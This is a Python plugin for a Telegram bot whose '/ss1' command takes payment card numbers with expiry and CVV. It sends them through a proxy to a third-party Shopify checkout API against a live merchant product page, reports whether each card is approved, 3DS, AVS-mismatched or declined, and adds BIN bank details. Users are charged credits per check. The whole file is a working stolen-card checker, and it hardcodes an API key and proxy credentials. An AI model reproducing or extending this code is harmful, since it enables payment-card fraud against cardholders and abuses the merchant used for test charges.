from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests, re, time, httpx
from plugins.func.users_sql import *
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("ss1"))
async def cmd_ss1(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = str(message.chat.type)

        regdata = fetchinfo(user_id)
        if not regdata:
            insert_reg_data(user_id, username, 0, str(date.today()))
            regdata = fetchinfo(user_id)

        role = regdata[2] or "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply_text(
                "Premium Users Required ⚠️\n"
                "Only Premium Users can use this in PM.\n"
                "Join group for free use:",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]]
                ),
                disable_web_page_preview=True
            )

        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")

        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s")

        if message.reply_to_message:
            cc_text = message.reply_to_message.text
        else:
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                return await message.reply_text("❌ Send a card after /ss1")
            cc_text = args[1]

        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
┏━━━━━━━⍟
┃  Shopify 2.47$
┗━━━━━━━━━━━⊛
⊙ CC: {fullcc}
⊙ Status: Checking...
⊙ Response: Waiting for Response...
""")

        tic = time.perf_counter()

        payload = {
            "key": "VDX-SHA2X-NZ0RS-O7HAM",
            "data": {
                "card": fullcc,
                "product_url": "https://musicworksunlimited.com/products/cuddle-up-cuddle-cub-music-single",
                "email": None,
                "proxy": "proxy.speedproxies.net:12321:uipido7851df:6691eddcc9f9_country-us",
                "ship_address": None,
                "is_shippable": False
            }
        }

        try:
            async with httpx.AsyncClient(timeout=20) as http_client:
                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                response = res.json()
                status_raw = response.get("status", "").lower()
                msg_raw = response.get("message", "") or response.get("error", "")

                if "processedreceipt" in status_raw:
                    card_status = "approved"
                elif "authentication" in status_raw or "3ds" in msg_raw.lower():
                    card_status = "3ds"
                elif "avs" in msg_raw.lower() or "cvc" in msg_raw.lower():
                    card_status = "avs"
                elif "declined" in msg_raw.lower() or "error" in msg_raw.lower():
                    card_status = "declined"
                else:
                    card_status = "unknown"

                card_message = msg_raw or "No response from gateway"
        except Exception as e:
            card_status = "error"
            card_message = f"Request failed: {e}"

        toc = time.perf_counter()

        try:
            binres = session.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}", timeout=10).json()
            brand = binres.get("vendor") or binres.get("scheme") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "")
        except:
            try:
                bininfo = session.get(f"https://lookup.binlist.net/{ccnum[:6]}", timeout=10).json()
                brand = bininfo.get("scheme", "UNKNOWN")
                type_ = bininfo.get("type", "N/A")
                level = bininfo.get("brand", "N/A")
                bank = bininfo.get("bank", {}).get("name", "N/A")
                country = bininfo.get("country", {}).get("name", "N/A")
                flag = bininfo.get("country", {}).get("emoji", "")
            except:
                brand = type_ = level = bank = country = flag = "N/A"

        brand, type_, level, bank, country = map(str.upper, [brand, type_, level, bank, country])

        if card_status == "approved":
            status = "Approved ✅"
        elif card_status == "3ds":
            status = "3D ❌"
            card_message = "3DS Authentication Required"
        elif card_status == "avs":
            status = "AVS Mismatch ❌"
        elif card_status == "declined":
            status = "Declined ❌"
        elif card_status == "error":
            status = "Error ⚠️"
        else:
            status = "Unknown ❓"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 2.47$ </b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await client.edit_message_text(chat_id, check_msg.id, final_msg)
        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")